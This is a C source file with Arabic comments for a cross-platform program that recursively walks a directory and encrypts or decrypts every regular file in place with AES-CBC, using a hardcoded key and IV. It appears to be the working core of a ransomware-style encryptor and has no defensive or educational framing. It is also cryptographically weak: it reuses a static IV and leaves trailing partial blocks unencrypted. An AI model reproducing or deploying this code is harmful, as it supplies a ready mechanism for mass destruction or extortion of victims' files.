#include <stdio.h>
#include <string.h>
#include <stdint.h>
#include "aes.h"

// تحديد النظام وتضمين المكتبات المناسبة
#ifdef _WIN32
    #include <windows.h>
#else
    #include <dirent.h>
    #include <sys/stat.h>
    #include <unistd.h>
#endif

#define BLOCK_SIZE 16

// مفتاح ثابت (في النسخ المتقدمة يتم اشتقاقه من كلمة مرور)
uint8_t key[] = { 0x60, 0x3d, 0xeb, 0x10, 0x15, 0xca, 0x71, 0xbe, 0x2b, 0x73, 0xae, 0xf0, 0x85, 0x7d, 0x77, 0x81 };
uint8_t iv[]  = { 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0a, 0x0b, 0x0c, 0x0d, 0x0e, 0x0f };

// دالة المعالجة المركزية (تشفير أو فك تشفير)
void process_file(const char* filePath, int encrypt) {
    FILE *f = fopen(filePath, "rb+");
    if (!f) return;

    struct AES_ctx ctx;
    AES_init_ctx_iv(&ctx, key, iv);

    uint8_t buffer[BLOCK_SIZE];
    while (fread(buffer, 1, BLOCK_SIZE, f) == BLOCK_SIZE) {
        if (encrypt) 
            AES_CBC_encrypt_buffer(&ctx, buffer, BLOCK_SIZE);
        else 
            AES_CBC_decrypt_buffer(&ctx, buffer, BLOCK_SIZE);
        
        fseek(f, -BLOCK_SIZE, SEEK_CUR);
        fwrite(buffer, 1, BLOCK_SIZE, f);
        fseek(f, 0, SEEK_CUR);
    }
    fclose(f);
    printf("[%s] %s\n", encrypt ? "ENCRYPTED" : "DECRYPTED", filePath);
}

// دالة التنقل المتكرر (تتكيف حسب النظام)
void walk_directory(const char* path, int encrypt) {
#ifdef _WIN32
    char searchPath[MAX_PATH];
    sprintf(searchPath, "%s\\*", path);
    WIN32_FIND_DATA fd;
    HANDLE hFind = FindFirstFile(searchPath, &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
        char fullPath[MAX_PATH];
        sprintf(fullPath, "%s\\%s", path, fd.cFileName);
        if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) walk_directory(fullPath, encrypt);
        else process_file(fullPath, encrypt);
    } while (FindNextFile(hFind, &fd));
    FindClose(hFind);
#else
    struct dirent *entry;
    DIR *dp = opendir(path);
    if (!dp) return;
    while ((entry = readdir(dp))) {
        if (strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0) continue;
        char fullPath[1024];
        snprintf(fullPath, sizeof(fullPath), "%s/%s", path, entry->d_name);
        struct stat st;
        if (stat(fullPath, &st) == 0) {
            if (S_ISDIR(st.st_mode)) walk_directory(fullPath, encrypt);
            else if (S_ISREG(st.st_mode)) process_file(fullPath, encrypt);
        }
    }
    closedir(dp);
#endif
}

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <mode: -e/-d> <path>\n", argv[0]);
        return 1;
    }

    int encrypt = (strcmp(argv[1], "-e") == 0);
    walk_directory(argv[2], encrypt);

    return 0;
}
